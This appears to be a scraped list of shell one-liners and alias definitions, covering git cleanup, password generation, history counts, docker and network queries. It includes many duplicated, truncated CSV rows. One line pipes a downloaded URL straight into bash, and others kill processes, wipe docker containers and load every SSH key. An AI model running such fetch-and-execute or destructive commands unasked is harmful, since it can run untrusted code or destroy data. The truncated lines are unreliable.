clean-branches | grep -v remote | cut -f 2 | grep -v release | grep -v master
clangcmake && make && find .. | ag clang_complete | xargs cat | sort | uniq > ../.clang_complete
circle | grep 'spec/' | cut -f 1 -d ' ' | uniq | xargs bundle exec rspec
cd;~/.dotfiles/scripts/startOpenVPN.sh ~/directi/mnet-client.ovpn `~/sshhhh mnetu | base64 --decode` `~/sshhhh mnetp | base64 --decode` `~/sshhhh mnetc2 | base64 --decode | python2 ~/.dotfiles/scripts/gauthenticator.py`
cd;~/.dotfiles/scripts/startOpenVPN.sh ~/directi/client.ovpn `~/sshhhh mnetu | base64 --decode` `~/sshhhh mnetp | base64 --decode` `~/sshhhh mnetc | base64 --decode | python2 ~/.dotfiles/scripts/gauthenticator.py`
cd$dir && test -e $dir.tmproj && open $dir.tmproj || (test -e $dir.xcodeproj && open $dir.xcodeproj || mate .)
cd ~/src/svn-puppet 2>/dev/null || cd ~/src/puppet 2>/dev/null || cd ~/src/my/cluster
cd /hadoop 2>/dev/null ||cd /app 2>/dev/null ||cd /*/domains 2>/dev/null
cd $HOME/lever/chef-repo; knife search node 'chef_environment:prod AND role:frontend' -i | grep -vE '(^$)|(found$)' | sed s/$/.s.lever.co/ | pssh -l enjalot -iP -t0 -h /dev/stdin sudo grep -irn '$1' '$2'
cd $HOME/lever/chef-repo; knife search node 'chef_environment:prod AND role:frontend' -i | grep -vE '(^$)|(found$)' | sed s/$/.s.lever.co/ | pssh -l enjalot -iP -t0 -h /dev/stdin echo 'one $1' 'two $2'
cd $(git rev-parse --show-toplevel 2> /dev/null || hg root 2> /dev/null || echo .)
cat ~/.ssh/config|grep -P 'Host |Forward' |grep -vP '^#' |sed 's/^Host /\n/'
cat ~/.oh-my-zsh/plugins/git/git.plugin.zsh | grep alias | sed 's/alias //' | sed 's/=/ /' | grep -E '^[A-z\!]+'
cat ~/.bashrc | grep -i '^function' | grep -v -i '^function set' | grep -v -i '^function is' | sort
cat ~/.bash_history | sort | uniq -c | sort -rn | head -n15
cat ~/.bash_history | sort | uniq -c | sort -rn | head -n 10
cat ~/.bash_history | sort | uniq -c | sort -n | tail
cat ~/.bash_history | sort | uniq -c | sort -gr | head
cat ~/.bash_history | sort | uniq -c | sort -g | tail
cat ~/.bash/history/* | awk '{print \$1}' | sort | uniq -c | sort -n
cat typescript | perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' | col -b > typescript-processed
cat source.bash || cat ../source.bash || cat ../../source.bash
cat package.json | jq '.scripts | to_entries[] | .key' | tr -d '\
cat build.gradle | grep 'version\s\?=' | sed 's/version//' | sed 's/=//' | sed 's/'\''//g'
cat \`perldoc -l perllocal\` | perl -nle '/C<Module> L<([^\\|]*?)\\|.*?>/ and print \$1' | sort -u
cat /var/log/system.log | grep sshd | sed '1!G;h;\$!d' | sed -e 's/^/* /' | fold -w 100 -s
cat /var/log/pacman.log | grep -aE '(installed|removed)' | sort -r | less
cat /vagrant/docs/index.md | grep version | tr -d '__' | tr -d [a-z] | tr -d ' '
cat /home/git/.gitolite/logs/gitolite-`date +%Y-%m -d -30days`.log | cut -f2 | sort | uniq -c | sort -n -r
cat /etc/os-release || lsb_release -a || hostnamectl
cat /etc/motd | grep 'AM' | grep '$(echo $HOSTNAME | tr '.' '\n' | grep 'shark').*' -A 100 -B 100
cat /dev/urandom| tr -dc 'a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?='|fold -w 12| head -n 1
cat /dev/urandom | uuencode -m - | head -n2 | tail -n1 | cut -c 1-8
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1 | xsel -b
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1 | xclip -selection clipboard
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 | xsel -b
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 | xclip -selection clipboard
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1 | xsel -b
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1 | xclip -selection clipboard
cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 9 | head -n 1 | sed 's/\(..\)\(...\)\(....\)/\1-\2-\3/'
cat /dev/urandom | strings | tr -d '\n' | tr -d ' ' | tr -d '\t'
cat /dev/urandom | strings | tr -d '\n' | tr -d ' ' | head -c
cat /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1
cat /dev/random |LC_ALL=C tr -dc 'A-Z9' | fold -w 81 | head -n 1 | qrencode -o ~/Desktop/IOTASeed.png; imgmore ~/Desktop/IOTASeed.png
cat /dev/random | hexdump -C | grep --color=auto $(uuidgen | tr -d '-' | cut -b 1-2)
cat .fslist | fzf --height=20 | tee /dev/tty | tr -d '\n' | xclip
cat .bash_history|sort|uniq -c|sort -rn|head -n 10
cat -n ~/.bash_history | sort -rk2 | sort -uk2 | sort -nk1 | cut -f2- > /tmp/.bash_history ; mv /tmp/.bash_history ~/.bash_history
cat *access.log | awk '{ print $1 }' | sort | uniq -c | wc -l
cat ${HISTFILE} | colrm 1 15 | sort | uniq -c | sort
cat $HISTFILE | sort | uniq -c | sort | head -100
cat $HISTFILE | sort | uniq -c | sort -rn | head
bundle install --local || bundle install || bundle update
bundle exec ruby -e 'puts Gem.loaded_specs.values.select{ |i| !i.extensions.empty? }.map{ |i| i.name }'
bundle check || bundle install --local || bundle install
brew-bundle-update | pv -C; echo;echo '--> brew ls --full-name --mulitple --versions' | tee $HOME/brew-list; brew ls --full-name --mulitple --versions | pv -C | tee -a $HOME/brew-list
brew upgrade $(brew outdated | cut -d ' ' -f1 | grep -v mysql | cut -d ':' -f2 | xargs)
brew cask install --force \$(brew cask outdated --greedy --verbose | grep -v 'latest' | tee /dev/tty | awk '{print \$1}' | xargs)
blame --line-porcelain HEAD | grep ""^author "" | sort | uniq -c | sort -nr"
bind -ps | egrep '\\\\C|\\\\e' | grep -v 'do-lowercase-version' | sort
bind -p | grep -Ev '(do-lowercase-version|digit-argument|not bound|self-insert)'
bind -p | egrep -v '^#|self-insert|do-lowercase-version|digit-argument'
bind -l | sed 's/.*/bind -q \0/' | /bin/bash 2>&1 | grep -v warning: | grep 'can be'
bind -Xps | egrep '\\\\C|\\\\e' | grep -v 'do-lowercase-version' | sort
bat .centerim5/clogs/Hangouts/wynandgouwswg/104062054821796402056 | urlscan -cn | uniq | tail | urlscan -c
axclone -list |grep eash |cut -f3 -d' ' |grep eash| xargs --max-procs=4 -t -n1 -r /home/nv/utils/axclone/RELEASE/bin/axclone.pl -delete -clone
aws ecs describe-tasks --cluster rally-dev --tasks `aws ecs list-tasks --cluster rally-dev | jq -r '. | .taskArns[0]'` | jq -r '. | .tasks[0].taskDefinitionArn'
aws ec2 describe-instances | jq -r '.Reservations | .[].Instances | .[] | .PublicIpAddress'
awk '{print $2}' | sort | uniq -c | sort -rg | head
awk '/^[^#]/ {print $1}' ~/.bash_history | sort | uniq -c | sort -nr | head -n 20
aqk 'print $1' ~/.bash_history | sort | uniq -c | sort -rn | head -n 20
apm list -i -b | perl -pe 's|^(.*?)@.*|\1|'
alias | sort | sed s/^alias\.// | sed -e 's/=/ /' | awk '{printf \
ag --depth=1 --files-with-matches --file-search-regex gemspec executables | xargs basename | cut -d. -f1 | sort | _copy_and_print '\n'
ag '(^[A-Za-z0-9_]|^)(TODO(S)?|FIXME|FINISH)([^A-Za-z0-9_]|$)'
adb shell dumpsys window | grep -E 'mCurrentFocus|mFocusedApp&Window' | cut -d' ' -f6 | cut -d'}' -f 1
adb shell dumpsys window | grep -E 'mCurrentFocus|mFocusedApp&Window' | cut -d' ' -f6 | cut -d'/' -f 1
adb logcat | grep `adb shell ps | command grep music | cut -c10-15` | grep
adb logcat | grep 'com.android.statistics\|eventID\|eventTag\|eventTime'
adb devices | tail -n +2 | cut -sf -1 | percol | xargs -I X adb -s X shell getprop ro.build.version.release
ack 'setTimeout|class_eval|Thread.new|connection.execute|find_by_sql' -hc app lib config
ack 'SELECT ' log/development.log | ack -o 'SELECT.*?=' | sort | uniq -c | sort
`history | tail -2 | head -1 | tr -s ' ' | cut -d ' ' -f 3-`
`git branch -a --merged | grep -v master | grep remotes/origin| sed -e 's% *remotes/origin/%%' | xargs -I% git push origin :%`
`[ -e bin/r ] && echo bin/r || [ -e bin/rails ] && echo bin/rails || echo rails`
_ dscacheutil -flushcache; echo `ps aux | grep mDNSResponder | grep -v grep | awk '{print $2}'` | xargs _ kill -HUP
[[ -f .venv/bin/activate ]] && source .venv/bin/activate || ([[ -f Pipfile ]] && pipenv shell || source ../.venv/bin/activate)
[[ $TMUX ]] || tmux attach || tmux
[ -f tmux.sh ] && ./tmux.sh || tmux ls 1>/dev/null 2>/dev/null && tmux attach || tmux
[ -d .git ] || git rev-parse --git-dir > /dev/null 2>&1 && gitroot || pwd
[ ${STY} ] || screen -U -rx || screen -U -D -RR
[ ! -e Makefile -a ! -e GNUmakefile ] && ( [ ! -e configure ] && [ -e autogen.sh ] && ./autogen.sh || [ -e configure.ac ] && autoreconf --install ; ./configure && make ) || make
LC_ALL=C ifconfig | grep 'inet addr' | grep -v '127.0.0.1' | cut -d: -f2 | cut -d' ' -f1
LANG=C ifconfig|grep inet|grep -v inet6|cut -d' ' -f2|grep -v 127.0.0.1
LANG=C ifconfig|grep 'inet '|grep -v '127.0.0.1'|xargs|cut -d' ' -f2
BacktrackTest w >& ~/X && cd .. || cd e >& ~/X && l || nogo
BacktrackTest u >& ~/X && cd .. || cd d >& ~/X && l || nogo
BacktrackTest sw>&~/X && cd .. || cd ne>& ~/X && l || nogo
BacktrackTest se>&~/X && cd .. || cd nw>& ~/X && l || nogo
BacktrackTest s >& ~/X && cd .. || cd n >& ~/X && l || nogo
BacktrackTest nw>&~/X && cd .. || cd se>& ~/X && l || nogo
BacktrackTest ne>&~/X && cd .. || cd sw>& ~/X && l || nogo
BacktrackTest n >& ~/X && cd .. || cd s >& ~/X && l || nogo
BLOCKSIZE=1048576; du -x | sort -nr | head -20 | grep -v \.hg | grep -v \.git
4441266,718990,dirf,find . -type d | sed -e """"s/[^-][^\/]*\// |/g"""" -e """"s/|\([^ ]\)/|-\1/"""""""
4306466,694796,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
4124442,652737,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3857413,603531,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3752922,590278,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3740215,587403,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3738636,587356,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3731347,587128,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3654258,584318,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3645620,583797,tree,find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'"""
3632436,583317,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3622371,582385,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3622230,582380,gbroom,git branch --merged | egrep -v '(^\*|master|dev)' | xargs git branch -d"""
3622081,582372,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3620963,582301,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3619343,582249,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3614017,582086,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3574176,576234,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3573995,576201,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3573898,576185,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3517673,564038,treei,tree -I '.cache|.git|node_modules|.stack-work|.cabal-sandbox'"""
3482136,551390,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3428514,539513,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3405063,536013,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3387784,533661,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3324632,528107,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3323483,528029,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3321340,527950,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3320955,527929,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3316547,527708,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3314358,527496,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3288140,525420,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3287871,525397,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3287598,525345,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3285936,525256,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3285663,525232,cds,cd `echo $PWD | gsed -e """"s|/Users/jsalter/xplan/[^/]\+|/Users/jsalter/xplan/$xbranch|""""`"""
3257564,523397,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3240037,519070,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3222433,516480,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3221332,516409,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3160634,510634,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3148335,508881,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3137863,507693,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3050881,500216,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3029376,497435,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3029280,497424,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3028420,497301,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3027923,497228,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3027483,497163,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3027190,497144,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3026600,497103,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3025215,497028,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3023852,496942,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3023308,496873,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
3005569,495163,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2>&1 | egrep 'assertions|^[A-Za-z]*Test$|FAIL |ERROR '
2> >(grep -v '|.*|\|+.*+\|^$') ssh
2> >(grep -v '|.*|\|+.*+\|^$') git
2952459,491804,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2923990,488696,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2922806,488601,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2922622,488557,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2922586,488551,tree,find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'"""
2922144,488497,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2921381,488452,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2920860,488416,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2920778,488411,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2920460,488387,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2920429,488385,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2920204,488369,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2837445,479542,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2789806,472958,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2789578,472910,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2676573,454112,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2649478,449897,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2623874,446185,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2604208,443574,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2598555,442922,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2570664,438937,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2308992,408827,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2244096,398830,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
2167501,385254,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
1793611,334907,agp_,agp '\\\$_(GET|POST|REQUEST|SERVER|COOKIE)'"""
1634397,324474,tree,find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'"""
1579674,317295,alert,notify-send --urgency=low -i """"$([ $? = 0 ] && echo terminal || echo error)"""" """"$(history|tail -n1|sed -e """
/usr/local/Cellar/elinks/0.11.7/bin/elinks -dump randomfunfacts.com | sed -n '/^| /p' | tr -d \|
/usr/bin/uuidgen | tr 'A-Z' 'a-z' | tee /dev/stderr | tr -d '\n' | pbcopy
/usr/bin/time --format='\tUser Time: %U sec | System Time: %S sec | Real Time: %e sec\n\tAvg CPU%% %P | Maximum Size of Process: %M KB | Avg Size of Memory: %Kkb'
/usr/bin/ls **/* -1 | tr '[A-Z]' '[a-z]' | sort | uniq -c | grep -v ' 1 '
/sbin/ifconfig | grep -Eo 'inet (addr:)?[0-9.]+' | grep -Eo '[0-9.]+' | grep -vF '127.0.0.1' | cat
/sbin/ifconfig | grep 'inet addr:' | sed '/127.0.0.1/d' | cut -d: -f2 | awk '{ print $1}'
/sbin/ifconfig | grep 'inet addr:' | grep -v 127.0.0.1 | awk -F: '{ print \$2 }' | awk '{ print \$1 }'
/sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}' | grep -Eo \
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s | sed 's/^[ \t]*//' | cut -d ' ' -f 1 | sort | uniq
./script/server | grep -E 'Param|Processing|Error|KLC' --color -b1
./make | tee temp.txt ; cat temp.txt | grep 'PDF Output file:' | cut -d: -f2 | xargs -n 1 -I {} sh -c 'web {}'
./fio-status --version | sed -e s'|.*@\(.*\)|curl http://hg.int.fusionio.com/firehose/raw-file/\1/src/fpga-image/INFO|'
*~(*.bz2|*.gz|*.tgz|*.zip|*.z)
*.(tar|gz|zip|rar|7z)
*.(jpg|png|gif|jpeg|webm)
*.(avi|wmv|mkv|mp4|flv)
err.txt generated.file succ.txt ̃(*.bz2|*.gz|*.tgz|*.zip|*.z)
); declare __oo__tryResult=$?; __oo__insideTryCatch+=-1; [[ $__oo__insideTryCatch -lt 1 ]] || set -${__oo__presetShellOpts:-e} && Exception::Extract $__oo__tryResult ||
(ps aux | head -1; ps aux | tail -n +2 | sort -nr -k 4) | $PAGER
(ps aux | head -1; ps aux | tail -n +2 | sort -nr -k 3) | $PAGER
(git diff --cached --name-only --diff-filter=ACM && git ls-files --other --exclude-standard) | grep '.*[jpg|png|gif]$' | imageOptim -a -q
(git branch -r | grep --color=never 'origin/feature' | xargs git branch -d -r) && (git branch -r | grep --color=never 'upstream/feature' | xargs git branch -d -r) && (git fetch --all)
(free -tm | head -3 | tail -1 | sed -s 's/ \+/ /g' | cut -d' ' -f 4)
(find / -regextype posix-extended -regex '.+\.pac(new|save|orig)' 2> /dev/null) || true
(docker-cleanc || true) && (docker-cleanv || true) && docker-cleani
(docker stop nginx || true) && (docker rm nginx || true) && docker run --name nginx -v ~/nginx:/etc/nginx/conf.d:cached -p 80:80 -p 7000:7000 -d nginx
(docker stop $(docker ps -a -q) || true) && (docker rm $(docker ps -a -q) || true)
(cd $CMSSW_BASE/src; ls -1d */*/BuildFile.xml */*/python | sed 's+/BuildFile.xml\|/python++' | sort | uniq)
(bundle check || bundle install) && (bin/run || bundle exec rake run)
(bundle check || bundle --local --jobs=4 || bundle --jobs=4)
(bin/rake db:migrate || bundle exec rake db:migrate) && (bin/rake db:test:prepare || bundle exec rake db:test:prepare)
(adb remount | grep succeeded || (adb root; sleep 5; adb remount)) | cat
([ -f mix.exs ] && mix phoenix.server) || ([ -f script/server ] && script/server || rails server)
([ -f mix.exs ] && iex -S mix) || ([ -f script/console ] && script/console || bundle exec rails console)
((git config --local --get remote.origin.url | sed -e 's/^.*git@github.com:\?/https:\/\/github.com/g' -e 's/\.git$/\/tree\//g'); (git branch 2>/dev/null| sed -n '/^\*/s/^\* //p'); echo '/'; (git rev-parse --show-prefix)) | tr -d '\n' | xargs $BROWSER
( for i in $( cowsay -l | tail -n $(( $(cowsay -l | wc -l) - 1 )) ); do fortune | cowsay -f $i; done ) | less
( ff .iml | xargs rm ) ; ( ff .ipr | xargs rm ) ; ( ff .iws | xargs rm ) ; ( ff .idea | xargs rm -r)
${EDITOR:=$({ which emacs || which nano || which vi; } 2>/dev/null)}
$EXE || c' 2>&-; echo_alias_result '||'
$(which find) . $prunePathsFindExpression -xdev -type f -size +10M -exec ls -lT {} \; 2>/dev/null | sort -nrk5 | column -t | head -n | awk
$(which find) . $prunePathsFindExpression -xdev -type f -size +10M -exec ls -lT {} \; 2>/dev/null | sort -nrk5 | column -t | head -n $(($LINES-4)) | awk
$(which find) . $prunePathsFindExpression -xdev -type f -size +10M -exec ls -lT {} \; 2>/dev/null | sort -nrk5 | column -t | head -50 | awk
$(which find) . $prunePathsFindExpression -xdev -type f -size +10M -exec ls -lT {} \; 2>/dev/null | sort -nrk5 | column -t | head -5 | awk
$(which find) . $prunePathsFindExpression -xdev -type f -size +10M -exec ls -lT {} \; 2>/dev/null | sort -nrk5 | column -t | head -10 | awk
$(ssh-agent -s;for key in $(ls ~/.ssh | egrep -v '(authorized_keys|config|*.pub|known_hosts)'); ssh-add ~/.ssh/${key})
$(ps aux | grep kafka | grep server3.properties | awk '{print $2}' | xargs kill -9)
$(ps aux | grep kafka | grep server2.properties | awk '{print $2}' | xargs kill -9)
$(ps aux | grep kafka | grep server1.properties | awk '{print $2}' | xargs kill -9)
$(ifconfig | grep inet | grep -v :: | grep -v inet6| awk '{print $2}')
$( command -v /usr/local/opt/coreutils/libexec/gnubin/date || command -v gdate || command -v date ) -u \
$'ps -ef | grep tty2 | awk \'{print $2}\' | head -n 1 | xargs kill'
$'git branch -r | awk \'{print $1}\' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk \'{print $1}\''
$'git branch --merged dev | cut -c 3- | grep -P --invert-match \'^(?:master|dev|release/.+)$\''
"~/trydoor; BacktrackTest e >& ~/X && cd .. || cd w >& ~/X && l||nogo;\
"{ 2>/dev/null hash curl && { curl -Lo- \""$url\"" | bash; } } || { 2>/dev/null hash wget && { wget -qO- \""$url\"" | bash; } }; $ps"
"zpool iostat -v 2>&1 | sed ""/^\s*$/d"" ; zpool status 2>&1 | sed ""/^\s*$/d"" | grep -v errors\:\ No\ known\ data\ errors ; echo ; df -h ; zfs get compressratio 2>&1 | grep --invert-match --color=none 1.00"
"yay -Ql | awk ""{print $2}"" | fzf --preview ""cat {}"" | tr -d ""\n"" | xclip -i -selection clipboard"
"yarn list | sed -r ""s/^\W*([\.a-zA-Z0-9-]+)@.*$/\1/"" | sort | uniq | wc -l"
"xprop | grep -w ""WM_NAME\|WM_CLASS\|WM_WINDOW_ROLE\|_NET_WM_STATE"""
"xgrep ""(\d+\.){4}\d+"" **/*~*.db(.) GV ""127.0.0.1|0.0.0.0|\.hint|\.zone"" Key ""(\d+\.){3}\d+|^.*?:"""
"xcrun simctl list devices | grep -v ""^[-=]"" | cut -d ""("" -f2 | cut -d "")"" -f1 | xargs -I {} xcrun simctl erase ""{}"""
"while (true) ; do clear ; git lga -n 15 ; echo -e ""\n====\n"" ; git status -s | grep -v smp2 | grep -v roject > /tmp/wg ; head -n 25 /tmp/wg ; echo -n ""Nb modified : ""$(cat /tmp/wg | wc -l)"" (""$(git status -s | wc -l)"")"" ; sleep 5 ; done"
"wget -q -O - http://feeds.bbc.co.uk/weather/feeds/rss/5day/id/1671.xml | grep title | sed -e ""s/<[^>]*>//g"" -e ""s/°//g"" | sed -e ""s/&#xB0;//g"" | egrep ""^[A-Z]"""
"watch -n 1 upower -i /org/freedesktop/UPower/devices/battery_BAT1 ""| grep -E \""state|energy\:|time|percentage\"""""
"watch -n 1 "" sensors -A | grep \""temp\\|fan1\\|Core \"" | grep -v coretemp "" "
"watch ""zpool iostat -v 2>&1 | sed \""/^\s*$/d\"" ; zpool status 2>&1 | sed \""/^\\s*$/d\"" | grep -v \""errors: No known data errors\"" ; echo ; df -h ; zfs get compressratio 2>&1 | grep --invert-match --color=none 1.00"""
"w | sort | uniq -w 4 | grep -v USER | grep -v ""load average"""
"voices | xargs echo | ruby -wne 'voices = \$_.split.collect { |voice| voice.tr(%q{_}, %q{ }) }; print voices[rand(voices.length)];'"
"vim -p -c ""tabdo VCSVimDiff HEAD"" `svn st -u | grep ""^M\|\*"" | cut -c 22- | xargs`"
"vim -p $(git status -s | egrep ""^(A | M )"" | cut -d"" "" -f3 | xargs)"
"vim -c ""try | call dein#update() | finally | qall! | endtry"" -N -u ~/.vimrc -U NONE -i NONE -V1 -e -s"
"vim -c "":argdo set eventignore-=Syntax | if &filetype != \""\"" | TOhtml | endif | wq"" -c ""wqa"""
"vim -c "":PlugUpgrade | :PlugUpdate | :PlugInstall | :PlugClean | :quitall"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep -E ""state|to\ full|to\ empty|percentage"""
